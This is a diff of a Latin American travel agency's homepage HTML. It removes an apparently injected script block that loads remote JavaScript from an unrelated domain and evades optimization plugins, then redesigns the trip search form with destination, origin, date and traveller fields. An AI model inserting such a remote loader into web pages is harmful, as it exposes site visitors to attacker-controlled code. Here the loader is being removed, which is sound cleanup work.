@@ -4,15 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Latam Expeditions | Viajes y paquetes a medida por Latinoamérica</title>
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1" data-cmp-ab="2">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.setAttribute("data-cmp-ab","2");
-      script.src = 'https://emrldtp.cc/NTkwMTEw.js?t=590110';
-      document.head.appendChild(script);
-  })();
-</script>
   <meta name="description" content="Diseñamos viajes por Perú, Colombia, Chile, Argentina, Brasil, México y toda Latinoamérica: experiencias seleccionadas, paquetes flexibles y asesoría local especializada." />
   <link rel="canonical" href="https://latamexpeditions.com/index.html" />
   <meta name="theme-color" content="#07833c" />
@@ -131,19 +122,48 @@
       <div class="home-search-shell__heading"><span class="home-search-shell__eyebrow">TU PRÓXIMO VIAJE EMPIEZA AQUÍ</span></div>
       <div class="home-service-panel" role="tabpanel" id="homePanelPackages" aria-labelledby="homeTabPackages" data-service-panel="paquetes">
                 <form class="search-card home-travel-form" id="tripSearchForm" role="search" aria-label="Buscador de viajes">
-          <div class="search-field">
-            <label for="searchDestination" >¿A dónde quieres viajar?</label>
-            <select id="searchDestination" name="destination"><option value="">Selecciona un destino</option><optgroup label="Países"><option value="peru">Perú</option><option value="chile">Chile</option><option value="ecuador">Ecuador</option><option value="colombia">Colombia</option><option value="argentina">Argentina</option><option value="brasil">Brasil</option><option value="bolivia">Bolivia</option><option value="mexico">México</option><option value="costa-rica">Costa Rica</option><option value="uruguay">Uruguay</option><option value="venezuela">Venezuela</option></optgroup><optgroup label="Destinos de Colombia"><option value="amazonas-leticia">Colombia · Amazonas / Leticia</option><option value="bahia-solano-nuqui">Colombia · Bahía Solano / Nuquí</option><option value="bogota">Colombia · Bogotá</option><option value="bogota-boyaca">Colombia · Bogotá / Boyacá</option><option value="bogota-cundinamarca">Colombia · Bogotá / Cundinamarca</option><option value="bogota-zipaquira">Colombia · Bogotá / Zipaquirá</option><option value="bogota-y-boyaca">Colombia · Bogotá y Boyacá</option><option value="bogota-y-medellin">Colombia · Bogotá y Medellín</option><option value="bogota-medellin-y-cartagena">Colombia · Bogotá, Medellín y Cartagena</option><option value="cali">Colombia · Cali</option><option value="cali-valle-del-cauca">Colombia · Cali / Valle del Cauca</option><option value="cali-y-eje-cafetero">Colombia · Cali y Eje Cafetero</option><option value="cali-y-valle-del-cauca">Colombia · Cali y Valle del Cauca</option><option value="cartagena">Colombia · Cartagena</option><option value="cartagena-baru">Colombia · Cartagena / Barú</option><option value="cartagena-islas-del-rosario">Colombia · Cartagena / Islas del Rosario</option><option value="cartagena-santa-catalina">Colombia · Cartagena / Santa Catalina</option><option value="cartagena-de-indias">Colombia · Cartagena de Indias</option><option value="cartagena-y-santa-marta">Colombia · Cartagena y Santa Marta</option><option value="choco-bahia-solano">Colombia · Chocó / Bahía Solano</option><option value="choco-nuqui">Colombia · Chocó / Nuquí</option><option value="eje-cafetero">Colombia · Eje Cafetero</option><option value="eje-cafetero-quindio">Colombia · Eje Cafetero / Quindío</option><option value="eje-cafetero-risaralda">Colombia · Eje Cafetero / Risaralda</option><option value="huila-san-agustin">Colombia · Huila / San Agustín</option><option value="huila-villavieja">Colombia · Huila / Villavieja</option><option value="medellin">Colombia · Medellín</option><option value="medellin-y-antioquia">Colombia · Medellín y Antioquia</option><option value="medellin-y-cartagena">Colombia · Medellín y Cartagena</option><option value="medellin-y-eje-cafetero">Colombia · Medellín y Eje Cafetero</option><option value="meta-la-macarena">Colombia · Meta / La Macarena</option><option value="san-andres">Colombia · San Andrés</option><option value="san-gil-santander">Colombia · San Gil / Santander</option><option value="santa-marta">Colombia · Santa Marta</option><option value="santa-marta-sierra-nevada">Colombia · Santa Marta / Sierra Nevada</option><option value="santa-marta-tayrona">Colombia · Santa Marta / Tayrona</option><option value="santander">Colombia · Santander</option><option value="sierra-nevada-de-santa-marta">Colombia · Sierra Nevada de Santa Marta</option></optgroup></select>
+          <div class="search-field lx-destination-field">
+            <label for="lxDestinationQuery">¿A dónde quieres viajar?</label>
+            <div class="lx-destination-combo" id="lxDestinationCombo">
+              <input id="lxDestinationQuery" name="destinationQuery" type="search" autocomplete="off" role="combobox" aria-autocomplete="list" aria-expanded="false" aria-controls="lxDestinationOptions" placeholder="País, ciudad o destino" required />
+              <input id="searchDestination" type="hidden" name="destination" value="" />
+              <div class="lx-destination-results" id="lxDestinationOptions" role="listbox" hidden></div>
+            </div>
           </div>
-          <div class="search-field">
-            <label for="searchType" data-i18n="search.type">Estilo de viaje</label>
-            <select id="searchType" name="travelType">
-              <option value="">Cualquier estilo</option><option value="aventura">Aventura</option><option value="playa">Playa y verano</option><option value="familia">En familia</option><option value="romantico">Romántico</option><option value="cultura">Cultura viva</option><option value="naturaleza">Naturaleza</option><option value="gastronomia">Gastronomía</option><option value="lujo">Lujo flexible</option>
+          <div class="search-field lx-origin-field">
+            <label for="searchOrigin">Ciudad de partida</label>
+            <select id="searchOrigin" name="origin" required>
+              <optgroup label="Perú"><option value="LIM">Lima (LIM)</option><option value="AQP">Arequipa (AQP)</option><option value="CUZ">Cusco (CUZ)</option><option value="JUL">Juliaca / Puno (JUL)</option><option value="PIU">Piura (PIU)</option><option value="IQT">Iquitos (IQT)</option><option value="TRU">Trujillo (TRU)</option><option value="TPP">Tarapoto (TPP)</option></optgroup>
+              <optgroup label="Colombia"><option value="BOG">Bogotá (BOG)</option><option value="MDE">Medellín (MDE)</option><option value="CTG">Cartagena (CTG)</option><option value="CLO">Cali (CLO)</option><option value="SMR">Santa Marta (SMR)</option><option value="ADZ">San Andrés (ADZ)</option><option value="PEI">Pereira (PEI)</option></optgroup>
+              <optgroup label="Argentina"><option value="EZE">Buenos Aires Ezeiza (EZE)</option><option value="AEP">Buenos Aires Aeroparque (AEP)</option><option value="COR">Córdoba (COR)</option><option value="MDZ">Mendoza (MDZ)</option></optgroup>
+              <optgroup label="Brasil"><option value="GRU">São Paulo (GRU)</option><option value="GIG">Río de Janeiro (GIG)</option></optgroup>
+              <optgroup label="Chile"><option value="SCL">Santiago (SCL)</option></optgroup>
+              <optgroup label="Ecuador"><option value="UIO">Quito (UIO)</option><option value="GYE">Guayaquil (GYE)</option></optgroup>
+              <optgroup label="México"><option value="MEX">Ciudad de México (MEX)</option><option value="CUN">Cancún (CUN)</option></optgroup>
+              <optgroup label="Otros países"><option value="PTY">Ciudad de Panamá (PTY)</option><option value="LPB">La Paz (LPB)</option><option value="VVI">Santa Cruz de la Sierra (VVI)</option><option value="MVD">Montevideo (MVD)</option><option value="CCS">Caracas (CCS)</option><option value="MIA">Miami (MIA)</option><option value="MAD">Madrid (MAD)</option></optgroup>
             </select>
           </div>
           <div class="search-field">
-            <label for="searchDate" >Fecha estimada</label>
-            <input type="date" id="searchDate" name="date" aria-label="Elige una fecha estimada" />
+            <label for="searchDate">Fecha exacta de llegada</label>
+            <input type="date" id="searchDate" name="date" required aria-label="Elige la fecha de inicio del viaje" />
+          </div>
+          <div class="search-field lx-guest-field">
+            <label for="lxGuestToggle">Viajeros</label>
+            <button id="lxGuestToggle" class="lx-guest-trigger" type="button" aria-expanded="false" aria-controls="lxGuestsPanel">2 adultos, 0 niños <i class="fa-solid fa-chevron-down" aria-hidden="true"></i></button>
+            <div id="lxGuestsPanel" class="lx-guests-panel" hidden>
+              <div class="lx-counter-line"><div><strong>Adultos</strong><small>12 años o más</small></div><div class="lx-counter"><button type="button" data-count="adults" data-delta="-1" aria-label="Quitar adulto">−</button><strong id="lxAdultsCount">2</strong><button type="button" data-count="adults" data-delta="1" aria-label="Agregar adulto">+</button></div></div>
+              <div class="lx-counter-line"><div><strong>Niños</strong><small>2 a 11 años</small></div><div class="lx-counter"><button type="button" data-count="children" data-delta="-1" aria-label="Quitar niño">−</button><strong id="lxChildrenCount">0</strong><button type="button" data-count="children" data-delta="1" aria-label="Agregar niño">+</button></div></div>
+              <p>Máximo 9 viajeros por solicitud. Las condiciones infantiles se validarán en la reserva.</p>
+              <button class="lx-guest-done" id="lxGuestsDone" type="button">Listo</button>
+            </div>
+            <input type="hidden" id="lxSearchAdults" name="adults" value="2" />
+            <input type="hidden" id="lxSearchChildren" name="children" value="0" />
+          </div>
+          <div class="search-field lx-style-field">
+            <label for="searchType">Estilo <span>(opcional)</span></label>
+            <select id="searchType" name="travelType">
+              <option value="">Cualquier estilo</option><option value="aventura">Aventura</option><option value="playa">Playa y verano</option><option value="familia">En familia</option><option value="romantico">Romántico</option><option value="cultura">Cultura viva</option><option value="naturaleza">Naturaleza</option><option value="gastronomia">Gastronomía</option><option value="lujo">Lujo flexible</option>
+            </select>
           </div>
           <button class="search-btn" type="submit">
             <i class="fa-solid fa-magnifying-glass" aria-hidden="true"></i>
@@ -884,6 +904,7 @@
   <script src="assets/js/main.js?v=home-tune-20261103" defer></script>
   <script src="assets/js/inicio-redesign.js" defer></script>
   <script src="assets/js/home-controls.js" defer></script>
+  <script src="assets/js/buscador-paquetes.js" defer></script>
   <script src="assets/js/cuentas.js" defer></script>
 </body>
 </html>
